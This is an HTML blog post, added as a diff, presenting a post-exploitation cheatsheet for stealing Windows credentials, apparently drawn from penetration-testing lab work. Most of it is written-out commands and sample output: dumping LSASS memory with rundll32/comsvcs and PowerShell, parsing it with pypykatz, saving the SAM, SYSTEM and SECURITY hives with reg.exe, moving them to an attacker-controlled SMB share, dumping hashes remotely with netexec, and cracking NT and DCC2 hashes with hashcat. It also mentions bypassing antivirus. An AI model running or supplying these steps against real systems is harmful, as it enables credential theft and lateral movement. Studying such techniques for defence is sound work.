@@ -1,0 +1,412 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      Post-Exploitation: Extracting Credentials from the Registry and LSASS | MazeZero</title>
+  <meta name="author" content="M3zeZer0">
+  
+  <meta name="description" content="In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the Local Security Authority Subsystem Service (LSASS).">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Post-Exploitation: Extracting Credentials from the Registry and LSASS"/>
+  <meta property="og:site_name" content="MazeZero"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="MazeZero" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/about.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.png" />
+        <link rel="shortcut icon" href="/favicon.png" />
+        <link rel="manifest" href="/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			MazeZero
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Cheatsheets & Notes
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Post-Exploitation: Extracting Credentials from the Registry and LSASS</h1>
+		</div>
+	
+
+
+
+	<div class="row post">
+		<!-- cols -->
+		
+			<div id="top_meta"></div>
+			<div class="col-md-9">
+				
+
+							<!-- content -->
+							<div class="mypage">
+								
+									<!-- <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the Local Security Authority Subsystem Service (LSASS).
+		 </div> alert -->
+									
+
+										<h1 id="Overview"><a href="#Overview" class="headerlink" title="_Overview"></a>_Overview</h1><p>In addition to acquiring copies of the SAM database to extract and crack password hashes, we will also benefit from targeting the <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem Service (LSASS)</a>.</p>
+<p>Upon initial logon, LSASS will:</p>
+<ul>
+<li>Cache credentials locally in memory</li>
+<li>Create <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">access tokens</a></li>
+<li>Enforce security policies</li>
+<li>Write to Windows’ <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/eventlog/event-logging-security">security log</a><br>Let’s cover some of the techniques and tools we can use to dump LSASS memory and extract credentials from a target running Windows.</li>
+</ul>
+<span id="more"></span>
+
+
+<h2 id="Securable-Objects"><a href="#Securable-Objects" class="headerlink" title="Securable Objects"></a>Securable Objects</h2><p>In Windows, <strong>securable objects</strong> are resources that the operating system protects through <strong>Access Control Lists (ACLs)</strong> and other security mechanisms. These objects can have permissions assigned to users or groups, allowing or denying access.</p>
+<h2 id="LSASS-Process-Memory-dump"><a href="#LSASS-Process-Memory-dump" class="headerlink" title="LSASS Process Memory dump"></a>LSASS Process Memory dump</h2><p>Similar to the process of attacking the SAM database, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. K</p>
+<h3 id="Through-task-manager"><a href="#Through-task-manager" class="headerlink" title="Through task manager"></a>Through task manager</h3><ol>
+<li>Open <code>Task Manager</code></li>
+<li>Select the <code>Processes</code> tab</li>
+<li>Find and right click the <code>Local Security Authority Process</code></li>
+<li>Select <code>Create dump file</code><br><img src="/../images/lasas.png" alt="LSASS process memory structure and credential storage"><br>A file called <code>lsass.DMP</code> is created and saved in <code>%temp%</code>. This is the file we will transfer to our attack host.</li>
+</ol>
+<h1 id="Through-rundll32"><a href="#Through-rundll32" class="headerlink" title="Through rundll32"></a>Through rundll32</h1><p>This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.</p>
+<p>With this command, we are running <code>rundll32.exe</code> to call an exported function of <code>comsvcs.dll</code> which also calls the MiniDumpWriteDump (<code>MiniDump</code>) function to dump the LSASS process memory to a specified directory (<code>C:\lsass.dmp</code>).</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\&gt; rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+<h2 id="Using-Powershell"><a href="#Using-Powershell" class="headerlink" title="Using Powershell"></a>Using Powershell</h2><p>Before issuing the command to create the dump file, we must determine what process ID (<code>PID</code>) is assigned to <code>lsass.exe</code>. This can be done from cmd or PowerShell:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># dump lsass</span></span><br><span class="line"><span class="built_in">Get-Process</span> lsass | <span class="built_in">Out-MiniDump</span> C:\Temp\lsass.dmp</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>that most modern AV tools recognize this as malicious activity and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing</p>
+<p>Now we can copy the dump file to our attack host and extract the credentials:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">pypykatz lsa minidump /home/peter/Documents/lsass.dmp</span> </span><br></pre></td></tr></table></figure>
+<br>
+
+<hr>
+<h2 id="What-can-be-found-inside-an-lsass-dump"><a href="#What-can-be-found-inside-an-lsass-dump" class="headerlink" title="What can be found inside an lsass dump"></a>What can be found inside an lsass dump</h2><h4 id="MSV"><a href="#MSV" class="headerlink" title="MSV"></a>MSV</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">sid S<span class="literal">-1-5-21-4019466498-1700476312-3544718034-1001</span></span><br><span class="line">luid <span class="number">1354633</span></span><br><span class="line">	== MSV ==</span><br><span class="line">		Username: bob</span><br><span class="line">		Domain: DESKTOP<span class="literal">-33E7O54</span></span><br><span class="line">		LM: NA</span><br><span class="line">		NT: <span class="number">64</span>f12cddaa88057e06a81b54e73b949b</span><br><span class="line">		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8</span><br><span class="line">		DPAPI: NA</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthn/msv1-0-authentication-package">MSV</a> is an authentication package in Windows that LSA calls on to validate logon attempts against the SAM database. </p>
+<h4 id="WDIGEST"><a href="#WDIGEST" class="headerlink" title="WDIGEST"></a>WDIGEST</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">== WDIGEST [<span class="number">14</span><span class="type">ab89</span>]==</span><br><span class="line">	username bob</span><br><span class="line">	domainname DESKTOP<span class="literal">-33E7O54</span></span><br><span class="line">	password None</span><br><span class="line">	password (hex)</span><br></pre></td></tr></table></figure>
+
+<p><code>WDIGEST</code> is an older authentication protocol enabled by default in <code>Windows XP</code> - <code>Windows 8</code> and <code>Windows Server 2003</code> - <code>Windows Server 2012</code>. LSASS caches credentials used by WDIGEST in clear-text.</p>
+<h4 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">== Kerberos ==</span><br><span class="line">	Username: bob</span><br><span class="line">	Domain: DESKTOP<span class="literal">-33E7O54</span></span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://web.mit.edu/kerberos/#what_is">Kerberos</a> is a network authentication protocol used by Active Directory in Windows Domain environments.<br>Domain user accounts are granted tickets upon authentication with Active Directory. This ticket is used to allow the user to access shared resources on the network that they have been granted access to without needing to type their credentials each time.<br>LSASS caches <code>passwords</code>, <code>ekeys</code>, <code>tickets</code>, and <code>pins</code> associated with Kerberos</p>
+<h4 id="DPAPI"><a href="#DPAPI" class="headerlink" title="DPAPI"></a>DPAPI</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">== DPAPI [<span class="number">14</span><span class="type">ab89</span>]==</span><br><span class="line">		luid <span class="number">1354633</span></span><br><span class="line">		key_guid <span class="number">3</span>e1d1091<span class="literal">-b792-45df-ab8e-c66af044d69b</span></span><br><span class="line">		masterkey e8bc2faf77e7bd1891c0e49f0dea9d447a491107ef5b25b9929071f68db5b0d55bf05df5a474d9bd94d98be4b4ddb690e6d8307a86be6f81be0d554f195fba92</span><br><span class="line">		sha1_masterkey <span class="number">52</span>e758b6120389898f7fae553ac8172b43221605</span><br></pre></td></tr></table></figure>
+<p>Mimikatz and Pypykatz can extract the DPAPI <code>masterkey</code> for logged-on users whose data is present in LSASS process memory. These masterkeys can then be used to decrypt the secrets associated with each of the applications using DPAPI and result in the capturing of credentials for various accounts. covered in privEsc</p>
+<h3 id="Crack-the-extracted-NT-hash"><a href="#Crack-the-extracted-NT-hash" class="headerlink" title="Crack the extracted NT hash"></a>Crack the extracted NT hash</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Security-Registry-Hives"><a href="#Security-Registry-Hives" class="headerlink" title="Security Registry Hives"></a>Security Registry Hives</h2><h1 id="Overview-1"><a href="#Overview-1" class="headerlink" title="_Overview"></a>_Overview</h1><p>With administrative access to a Windows system, one of the most effective post-exploitation techniques is to dump the Security Account Manager (SAM) database. The SAM stores hashed credentials for local user accounts and is a valuable target for attackers aiming to escalate privileges or move laterally within a network.</p>
+<p>By extracting SAM, SYSTEM, and SECURITY hives from the target machine, we can transfer them to our attack host and perform offline hash cracking using tools such as Hashcat or John the Ripper, or even perform Pass-the-Hash attacks.</p>
+<h2 id="Windows-Registery-Hives"><a href="#Windows-Registery-Hives" class="headerlink" title="Windows Registery Hives"></a>Windows Registery Hives</h2><p>There are three registry hives we can copy if we have<code> local administrative</code> access to a target system, each serving a specific purpose when it comes to dumping and cracking password hashes. A brief description of each is provided in the table below:</p>
+<table>
+<thead>
+<tr>
+<th>Registry Hive</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>HKLM\SAM</code></td>
+<td>Contains password hashes for local user accounts. These hashes can be extracted and cracked to reveal plaintext passwords.</td>
+</tr>
+<tr>
+<td><code>HKLM\SYSTEM</code></td>
+<td>Stores the system boot key, which is used to encrypt the SAM database. This key is required to decrypt the hashes.</td>
+</tr>
+<tr>
+<td><code>HKLM\SECURITY</code></td>
+<td>Contains sensitive information used by the Local Security Authority (LSA), including cached domain credentials (DCC2), cleartext passwords, DPAPI keys, and more.</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h1 id="hash-differences"><a href="#hash-differences" class="headerlink" title="hash differences"></a>hash differences</h1><table>
+<thead>
+<tr>
+<th>Feature</th>
+<th>SAM (SAM + SYSTEM)</th>
+<th>LSA Secrets (SECURITY)</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Focus</td>
+<td>Local account password hashes</td>
+<td>Cached credentials &amp; secrets (domain creds, etc.)</td>
+</tr>
+<tr>
+<td>Format</td>
+<td>NTLM hashes</td>
+<td>Plaintext or encrypted strings</td>
+</tr>
+<tr>
+<td>Common Use</td>
+<td>Crack local user passwords</td>
+<td></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="cheatsheet"><a href="#cheatsheet" class="headerlink" title="cheatsheet"></a>cheatsheet</h2><h3 id="Manually-dumping-the-Registry-hives"><a href="#Manually-dumping-the-Registry-hives" class="headerlink" title="Manually dumping the Registry hives"></a>Manually dumping the Registry hives</h3><p>  <code>reg.exe</code> to save copies of the registry hives:</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; reg.exe save hklm\sam C:\sam.save</span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\system C:\system.save</span><br><span class="line"></span><br><span class="line">&gt; reg.exe save hklm\security C:\security.save</span><br></pre></td></tr></table></figure>
+
+<p> copy to VM:</p>
+<ul>
+<li>create a smb share on attacking vm</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ impacket-smbserver -smb2support compdata /home/demise/mountshare</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>move hives to share:</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">C:\&gt; <span class="built_in">move</span> sam.save \\<span class="number">10.10</span>.<span class="number">15.16</span>\compdata</span><br><span class="line">      </span><br><span class="line"></span><br><span class="line"> <span class="built_in">move</span> security.save \\<span class="number">10.10</span>.<span class="number">15.16</span>\compdata</span><br><span class="line">       </span><br><span class="line"></span><br><span class="line"> <span class="built_in">move</span> system.save \\<span class="number">10.10</span>.<span class="number">15.16</span>\compdata</span><br><span class="line">     </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ls</span><br><span class="line"></span><br><span class="line">sam.save  security.save  system.save</span><br></pre></td></tr></table></figure>
+<h3 id="Extracting-hashes-from-hives-with-impacket"><a href="#Extracting-hashes-from-hives-with-impacket" class="headerlink" title="Extracting hashes from hives with impacket"></a>Extracting hashes from hives with impacket</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::</span><br></pre></td></tr></table></figure>
+
+<p> format:</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uid:rid:lmhash:nthash</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="Extracting-SAM-and-LSA-hashes-Remotely-using-netexec"><a href="#Extracting-SAM-and-LSA-hashes-Remotely-using-netexec" class="headerlink" title="Extracting SAM and LSA hashes Remotely using netexec"></a>Extracting SAM and LSA hashes Remotely using netexec</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dump LSA  hashes remotely (machine-secrets)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netexec smb 10.129.42.198 --local-auth -u bob -pattacker-password! --lsa</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">dump SAM  hashes remotely (local-user-passwords)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netexec smb 10.129.42.198 --local-auth -u bob -pattacker-password! --sam</span></span><br></pre></td></tr></table></figure>
+<br>
+
+<hr>
+<h4 id="crack-NT-hash-with-hashcat"><a href="#crack-NT-hash-with-hashcat" class="headerlink" title="crack NT hash with hashcat"></a>crack NT hash with hashcat</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hashcat -m 1000 c02478537b9727d391bc80011c2e2321 /usr/share/wordlists/rockyou.txt  -D 1 -O</span>     </span><br></pre></td></tr></table></figure>
+
+
+<h3 id="cracking-DCC2-Hash-from-Security-hive"><a href="#cracking-DCC2-Hash-from-Security-hive" class="headerlink" title="cracking DCC2 Hash (from Security hive)"></a>cracking DCC2 Hash (from Security hive)</h3><p>hashed copies of network credential hashes. An example is:</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">echoridge.local/Administrator:$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25</span><br></pre></td></tr></table></figure>
+<p>The Hashcat mode for cracking DCC2 hashes is <code>2100</code>.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hashcat -m 2100 &#x27;$DCC2$10240#administrator#23d97555681813db79b2ade4b4a6ff25&#x27; /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+
+											<div class="article-footer-copyright">
+
+</div>
+
+							</div>
+
+							
+									
+											<div>
+												<center>
+
+													<div class="pagination">
+
+    
+    
+    <a href="/2025/06/20/Writing targeted password lists/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/03/26/dcsync/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+												</center>
+											</div>
+
+											<!-- comment -->
+											<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+											
+													
+															
+					</div> <!-- col-md-9/col-md-12 -->
+
+
+
+					
+						<div class="col-md-3" id="side_meta">
+							<div id="post_meta">
+
+	<!-- date -->
+	
+		<div class="meta-widget">
+			<i class="fa fa-clock-o"></i>
+			2025-05-22
+		</div>
+		
+
+			<!-- categories -->
+			
+
+					<!-- tags -->
+					
+						<div class="meta-widget">
+							<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>
+							<ul id="tags" class="tag_box list-unstyled collapse in">
+								  
+  <li><a href="/tags/lsass/">lsass<span>1</span></a></li> <li><a href="/tags/secretsdump/">secretsdump<span>1</span></a></li> <li><a href="/tags/mimikatz/">mimikatz<span>2</span></a></li>
+							</ul>
+						</div>
+						
+
+
+
+							<hr>
+
+                            <!-- Table of Contents -->
+                            <div id="content-toc" class="blog-toc">
+                                <div id="toc-nav" class="toc-nav"></div>
+                            </div>
+</div><!-- col-md-3 -->
+						</div>
+						
+
+
+			</div><!-- row -->
+
+			<!--
+ -->
+
+
+			<!-- Fixed TOC Container for hexo-toc.js -->
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 M3zeZer0's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  <a id="gotop" href="#">
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script>
+<script src="/js/hexo-toc.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript">
+    (function ($) {
+      $('.fancybox').fancybox();
+    })(jQuery);
+  </script>
+  
+
+    
+      <script type="text/javascript">
+        var search_path = "search.xml";
+        if (search_path.length == 0) {
+          search_path = "search.xml";
+        }
+        var path = "/" + search_path;
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      </script>
+      
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
